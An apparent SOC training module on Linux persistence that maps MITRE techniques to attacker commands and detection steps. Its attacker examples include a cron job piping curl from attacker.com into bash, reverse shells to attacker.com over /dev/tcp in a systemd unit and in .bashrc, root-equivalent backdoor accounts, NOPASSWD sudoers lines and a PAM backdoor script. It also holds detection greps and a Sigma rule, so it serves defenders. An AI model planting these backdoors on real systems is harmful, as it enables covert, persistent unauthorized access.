# Linux/09 — Persistence Mechanisms

> Persistence is how an attacker survives a reboot. Every persistence technique on Linux abuses a legitimate OS mechanism — cron, systemd, PAM, shell profiles, kernel modules. Understanding every mechanism is the only way to enumerate them all during an investigation.

![MITRE](https://img.shields.io/badge/MITRE-T1053%20|%20T1543%20|%20T1546%20|%20T1547-red)
![Platform](https://img.shields.io/badge/Platform-Linux-orange)

---

## Persistence Map

```
Linux Persistence
    |
    +-- Scheduled Execution
    |       +-- cron (user, system, /etc/cron.d)
    |       +-- systemd timers
    |       +-- at jobs
    |
    +-- Service/Init Persistence
    |       +-- systemd service units
    |       +-- SysV init scripts (/etc/init.d)
    |       +-- rc.local
    |
    +-- Shell & Login Hooks
    |       +-- ~/.bashrc, ~/.bash_profile
    |       +-- /etc/profile, /etc/profile.d/
    |       +-- ~/.config/autostart/
    |
    +-- Library Hijacking
    |       +-- /etc/ld.so.preload
    |       +-- LD_PRELOAD in environment
    |       +-- malicious .so in library path
    |
    +-- Credential-Based
    |       +-- SSH authorized_keys
    |       +-- /etc/passwd new user
    |       +-- /etc/sudoers modification
    |
    +-- Kernel Level
    |       +-- Loadable Kernel Modules (rootkits)
    |       +-- /etc/modules
    |       +-- /etc/modprobe.d/
    |
    +-- PAM
            +-- /etc/pam.d/ modification
            +-- pam_exec backdoor
```

---

## 1. Cron Jobs (T1053.003)

The most common persistence mechanism. cron executes commands on a schedule.

### Cron Locations

```
/etc/crontab              system-wide crontab
/etc/cron.d/              drop-in cron files (any user, requires root to write)
/etc/cron.hourly/         scripts run hourly
/etc/cron.daily/          scripts run daily
/etc/cron.weekly/         scripts run weekly
/etc/cron.monthly/        scripts run monthly
/var/spool/cron/crontabs/ per-user crontabs (edited via crontab -e)
```

### Crontab Format

```
# m  h  dom  mon  dow  user  command
  *  *   *    *    *   root  /tmp/.update.sh
  @reboot              root  /tmp/.backdoor &
```

`@reboot` executes once at system boot — a common attacker choice.

### Attacker Techniques

```bash
# Add system cron job (requires root)
echo "* * * * * root curl http://attacker.com/payload | bash" >> /etc/crontab

# Add via cron.d (harder to spot)
echo "*/5 * * * * root /tmp/.x" > /etc/cron.d/systemd-update

# Add user crontab (no root required)
(crontab -l 2>/dev/null; echo "@reboot /home/user/.cache/.payload &") | crontab -

# Hidden script in cron.d with legitimate-looking name
echo "@reboot root /etc/cron.d/.helper" > /etc/cron.d/apt-helper
```

### Detection

```bash
# Enumerate all cron locations
cat /etc/crontab
ls -la /etc/cron.d/ && cat /etc/cron.d/*
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
for user in $(cut -d: -f1 /etc/passwd); do
  cron=$(crontab -l -u $user 2>/dev/null | grep -v "^#\|^$")
  [ -n "$cron" ] && echo "=== $user ===" && echo "$cron"
done

# Look for network calls in cron
grep -r "curl\|wget\|nc \|bash\|python" /etc/cron* /var/spool/cron/ 2>/dev/null
```

---

## 2. Systemd Units (T1543.002)

systemd is the init system on all modern Linux distributions. Service units define what runs at boot and how.

### Unit File Locations

```
/etc/systemd/system/          system-wide units (highest priority)
/usr/lib/systemd/system/      package-installed units
/usr/local/lib/systemd/system/ locally installed units
~/.config/systemd/user/        user-level units (no root required)
```

### Malicious Service Unit

```ini
# /etc/systemd/system/system-update.service
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=forking
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
# Enable and start
systemctl enable system-update.service
systemctl start system-update.service
```

### Systemd Timers (T1053.006)

Timers trigger units on a schedule — a stealthier alternative to cron.

```ini
# /etc/systemd/system/beacon.timer
[Unit]
Description=Beacon Timer

[Timer]
OnBootSec=1min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
```

### Detection

```bash
# List all enabled services
systemctl list-unit-files --state=enabled --no-pager

# List non-standard units (not in /usr/lib/systemd)
systemctl list-units --type=service --no-pager |
  while read -r unit _; do
    path=$(systemctl show "$unit" -p FragmentPath 2>/dev/null | cut -d= -f2)
    echo "$path" | grep -vqE "^/usr/lib|^/lib" && echo "NON-STANDARD: $unit -> $path"
  done

# List active timers
systemctl list-timers --no-pager

# Check unit file content
cat /etc/systemd/system/*.service 2>/dev/null
```

---

## 3. Shell Profile Hooks (T1546.004)

Files executed when a user opens a shell or logs in. No root required for user-level files.

### Profile Files — Execution Order

```
Login shell:
  /etc/profile          -> /etc/profile.d/*.sh  -> ~/.bash_profile -> ~/.bashrc

Interactive non-login shell:
  /etc/bash.bashrc      -> ~/.bashrc

GNOME/Desktop login:
  ~/.config/autostart/*.desktop files
```

### Attacker Techniques

```bash
# User-level persistence (no root)
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1 &" >> ~/.bashrc
echo "/tmp/.payload &" >> ~/.bash_profile

# System-wide (requires root)
echo "/tmp/.payload &" >> /etc/profile
echo "/tmp/.payload &" > /etc/profile.d/updates.sh

# Alias hijacking in bashrc
echo "alias sudo='sudo \$@ && /tmp/.payload'" >> ~/.bashrc
```

### Detection

```bash
# Check all profile files
cat /etc/profile
cat /etc/bash.bashrc
ls -la /etc/profile.d/ && cat /etc/profile.d/*

# Check all user bashrc/profile files
for home in /home/* /root; do
  for f in .bashrc .bash_profile .profile .zshrc; do
    [ -f "$home/$f" ] && echo "=== $home/$f ===" && cat "$home/$f"
  done
done

# Look for network connections in profile files
grep -r "curl\|wget\|nc \|bash.*tcp\|python" /etc/profile* ~/.bashrc ~/.bash_profile 2>/dev/null

# GNOME autostart
ls -la ~/.config/autostart/ 2>/dev/null
cat ~/.config/autostart/*.desktop 2>/dev/null
```

---

## 4. SSH Authorized Keys (T1098.004)

Adding a public key to `authorized_keys` grants persistent passwordless SSH access.

```bash
# Attacker generates key pair (on their machine)
ssh-keygen -t ed25519 -f backdoor_key

# Plants public key on target
echo "ssh-ed25519 AAAA... attacker" >> ~/.ssh/authorized_keys

# Now connects without password from anywhere
ssh -i backdoor_key user@target
```

### Locations

```
~/.ssh/authorized_keys          per-user
/root/.ssh/authorized_keys      root access
/etc/ssh/authorized_keys        (non-standard, check sshd_config)
```

### sshd_config Persistence

```bash
# Attacker modifies sshd config for persistence
# /etc/ssh/sshd_config
PermitRootLogin yes              # enable root SSH login
PasswordAuthentication yes       # enable password auth
AuthorizedKeysFile /tmp/.keys   # point to attacker-controlled keys file
```

### Detection

```bash
# Find all authorized_keys files
find / -name "authorized_keys" -type f 2>/dev/null

# Check content of each
find / -name "authorized_keys" 2>/dev/null | while read -r f; do
  echo "=== $f ===="
  cat "$f"
done

# Check sshd_config for suspicious settings
grep -E "PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Match" /etc/ssh/sshd_config

# Check modification time
stat /root/.ssh/authorized_keys 2>/dev/null
```

---

## 5. Rogue User Accounts (T1136.001)

Creating a backdoor account — either via /etc/passwd directly or useradd.

```bash
# Create user with UID 0 (root-equivalent)
echo "support:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "support:$(openssl passwd -1 'password123')" >> /etc/shadow

# Create normal-looking user
useradd -m -s /bin/bash svc-monitor
echo "svc-monitor:Password123!" | chpasswd

# Add existing user to sudo group
usermod -aG sudo svc-monitor
```

### Detection

```bash
# Users with UID 0 (besides root)
awk -F: '$3==0 {print}' /etc/passwd

# Users with login shells
grep -v "nologin\|false\|sync\|halt\|shutdown" /etc/passwd

# Recently created users
ls -la /home/
stat /etc/passwd   # check modification time

# Check shadow for new password hashes
stat /etc/shadow
```

---

## 6. Sudoers Modification (T1548.003)

Granting sudo without password requirement — allows privilege escalation on demand.

```bash
# Grant full root without password
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "attacker ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/attacker

# Grant specific binary without password
echo "www-data ALL=(ALL) NOPASSWD: /bin/bash" >> /etc/sudoers
```

### Detection

```bash
# Review sudoers
cat /etc/sudoers
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/*

# Check modification time
stat /etc/sudoers

# Find NOPASSWD entries
grep "NOPASSWD" /etc/sudoers /etc/sudoers.d/* 2>/dev/null
```

---

## 7. LD_PRELOAD Persistence (T1574.006)

A shared library listed in `/etc/ld.so.preload` is loaded by every dynamically linked process on the system. This is the most powerful userspace persistence mechanism — it intercepts system calls for every process.

```bash
# Plant malicious library
echo "/lib/x86_64-linux-gnu/libsystem.so" > /etc/ld.so.preload

# The library intercepts open(), read(), getdents() etc. to:
# - hide files starting with .rootkit
# - hide process with specific PID
# - provide backdoor authentication in PAM
```

### Detection

```bash
# This file should not exist on a clean system
cat /etc/ld.so.preload 2>/dev/null || echo "CLEAN - file does not exist"
ls -la /etc/ld.so.preload 2>/dev/null

# Check library path for unknown libraries
ldconfig -p | grep -v "/usr/\|/lib/"

# Check LD_PRELOAD in process environments
grep -r "LD_PRELOAD" /proc/*/environ 2>/dev/null
```

---

## 8. Kernel Module Rootkits (T1547.006)

A Loadable Kernel Module (LKM) running as a rootkit operates in kernel space — it can hide processes, files, network connections, and itself from all userspace tools.

```bash
# Load kernel module (requires root)
insmod rootkit.ko
modprobe rootkit

# Make persistent via /etc/modules
echo "rootkit" >> /etc/modules
echo "install rootkit /sbin/insmod /lib/modules/rootkit.ko" > /etc/modprobe.d/rootkit.conf
```

### Rootkit Detection Strategy

```bash
# Compare three module sources — discrepancy = hidden module
lsmod | awk 'NR>1{print $1}' | sort > /tmp/lsmod.txt
cat /proc/modules | awk '{print $1}' | sort > /tmp/proc.txt
ls /sys/module/ | sort > /tmp/sys.txt
diff /tmp/lsmod.txt /tmp/proc.txt
diff /tmp/lsmod.txt /tmp/sys.txt

# Check for unsigned modules
for mod in $(lsmod | awk 'NR>1{print $1}'); do
  signer=$(modinfo $mod 2>/dev/null | grep "^signer:" | awk '{print $2}')
  filename=$(modinfo $mod 2>/dev/null | grep "^filename:" | awk '{print $2}')
  [ -z "$signer" ] && echo "UNSIGNED: $mod -> $filename"
done

# Check dmesg for module loading
dmesg | grep -i "module\|insmod\|modprobe"

# Check /proc/modules for out-of-tree
cat /proc/modules | awk '{print $1, $6}' | grep -v "(builtin)\|(permanent)"
```

---

## 9. PAM Backdoor (T1556.003)

PAM (Pluggable Authentication Modules) controls authentication for SSH, sudo, login, and all other services. A malicious PAM module accepts a backdoor password for any account.

```bash
# /etc/pam.d/sshd modification
# Add line before existing auth:
auth sufficient pam_exec.so /tmp/.auth_check.sh

# The script accepts backdoor password
cat > /tmp/.auth_check.sh << 'SCRIPT'
#!/bin/bash
read -s pass
[ "$pass" = "s3cr3tb4ckd00r" ] && exit 0
exit 1
SCRIPT
```

### Detection

```bash
# Review all PAM configs
ls /etc/pam.d/
cat /etc/pam.d/sshd
cat /etc/pam.d/sudo
cat /etc/pam.d/login
cat /etc/pam.d/common-auth

# Look for pam_exec or unusual modules
grep -r "pam_exec\|pam_python\|sufficient.*exec" /etc/pam.d/

# Check PAM library directory for unexpected modules
ls -la /lib/x86_64-linux-gnu/security/
ls -la /usr/lib/x86_64-linux-gnu/security/
```

---

## 10. rc.local and Init Scripts

Legacy persistence mechanisms still present on many systems.

```bash
# rc.local — executed at end of multiuser boot
cat /etc/rc.local

# SysV init scripts
ls /etc/init.d/
cat /etc/init.d/suspicious-service

# rc directories
ls /etc/rc*.d/
```

---

## Persistence Hunter — Full Enumeration

```bash
#!/usr/bin/env bash
# Quick persistence enumeration
echo "=== CRON ===" && cat /etc/crontab 2>/dev/null
echo "=== CRON.D ===" && ls -la /etc/cron.d/ && cat /etc/cron.d/* 2>/dev/null
echo "=== USER CRONS ===" && for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null && echo "--- $u ---"; done
echo "=== SYSTEMD ===" && systemctl list-unit-files --state=enabled --no-pager
echo "=== SYSTEMD TIMERS ===" && systemctl list-timers --no-pager
echo "=== RC.LOCAL ===" && cat /etc/rc.local 2>/dev/null
echo "=== PROFILE.D ===" && ls -la /etc/profile.d/ && cat /etc/profile.d/* 2>/dev/null
echo "=== LD_PRELOAD ===" && cat /etc/ld.so.preload 2>/dev/null || echo "Clean"
echo "=== SSH KEYS ===" && find / -name authorized_keys 2>/dev/null -exec cat {} \;
echo "=== UID 0 USERS ===" && awk -F: '$3==0' /etc/passwd
echo "=== SUDOERS ===" && cat /etc/sudoers && cat /etc/sudoers.d/* 2>/dev/null
echo "=== KERNEL MODULES ===" && lsmod
echo "=== PAM ===" && grep -r "pam_exec\|sufficient" /etc/pam.d/ 2>/dev/null
```

---

## MITRE ATT&CK Mapping

| Technique | ID |
|-----------|-----|
| Scheduled Task/Job: Cron | T1053.003 |
| Scheduled Task/Job: Systemd Timer | T1053.006 |
| Create or Modify System Process: Systemd Service | T1543.002 |
| Boot/Logon Init Scripts: RC Scripts | T1037.004 |
| Boot/Logon Init Scripts: Unix Shell Profile | T1546.004 |
| Account Manipulation: SSH Authorized Keys | T1098.004 |
| Create Account: Local Account | T1136.001 |
| Abuse Elevation: Sudo and Sudo Caching | T1548.003 |
| Hijack Execution: LD_PRELOAD | T1574.006 |
| Boot/Logon Autostart: Kernel Modules | T1547.006 |
| Modify Authentication Process: PAM | T1556.003 |

---

## Sigma Rule — Systemd Service Created Outside Package Manager

```yaml
title: New Systemd Service Created in Non-Standard Location
id: a7b8c9d0-e1f2-3456-abcd-567890123456
status: stable
description: >
  Detects creation of systemd service unit files outside
  of package manager managed directories. Attackers create
  malicious service units in /etc/systemd/system/ for persistence.
author: Solomon James (@Jaysolex)
tags:
  - attack.persistence
  - attack.t1543.002
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: PATH
    name|startswith: '/etc/systemd/system/'
    name|endswith: '.service'
    nametype: CREATE
  condition: selection
falsepositives:
  - Legitimate software installation outside package manager
  - Admin creating custom service units
level: medium
```

---

## Practitioner Notes

**On persistence enumeration completeness:** No single tool enumerates every persistence location. Run the persistence hunter script above, then manually verify systemd units, PAM configs, and kernel modules. Automated tools miss PAM backdoors and LD_PRELOAD almost universally.

**On @reboot cron entries:** The `@reboot` cron macro is frequently overlooked during investigations. It does not appear in time-based cron output and is easy to miss when scanning crontab files. Always grep specifically for `@reboot` across all cron locations.

**On systemd user units:** `~/.config/systemd/user/` requires no root access and persists with the user account. User-level systemd units are often missed during IR because investigators focus on system-level `/etc/systemd/system/`. Run `systemctl --user list-unit-files` as each user to enumerate these.

**On LD_PRELOAD as a detection bypass:** A rootkit using LD_PRELOAD intercepts libc calls including `readdir()` and `open()`. This means standard tools like `ls`, `find`, and `cat` may not see files the rootkit is hiding. Cross-reference with `/proc` (which bypasses libc) and compare network connections from `/proc/net/tcp` against `ss` output.

---

## Knowledge Validation

**An attacker plants a cron job in /etc/cron.d/ with a legitimate-looking name. How do you detect it?**
Enumerate every file in `/etc/cron.d/` and read its content — do not just list filenames. Cross-reference against known package-installed cron files using `dpkg -S /etc/cron.d/*` or `rpm -qf`. Any file not owned by a package is suspicious. Check modification timestamps against known maintenance windows. Look for network commands (curl, wget, nc) or references to paths in /tmp or /dev/shm.

**Why is /etc/ld.so.preload a critical finding and what is the detection limitation?**
Any library in `/etc/ld.so.preload` is loaded by every dynamically linked process before all others. A rootkit here intercepts libc function calls system-wide — hiding files, processes, and network connections from tools that use libc (ls, ps, ss, netstat). The detection limitation is that the rootkit itself may hide the `/etc/ld.so.preload` file from `cat` and `ls`. Cross-reference by reading via `/proc/self/fd` or using statically linked binaries that do not load dynamic libraries.

**What persistence mechanism requires no root access and survives account password changes?**
SSH authorized_keys — a public key added to `~/.ssh/authorized_keys` allows authentication with the corresponding private key regardless of the account password. Password changes do not affect key-based authentication. Detection requires reviewing authorized_keys content and correlating key fingerprints against authorized fleet-wide key inventory.

---

*Linux/09-Persistence-Mechanisms | OS-Internals-for-SOC | Solomon James (@Jaysolex)*
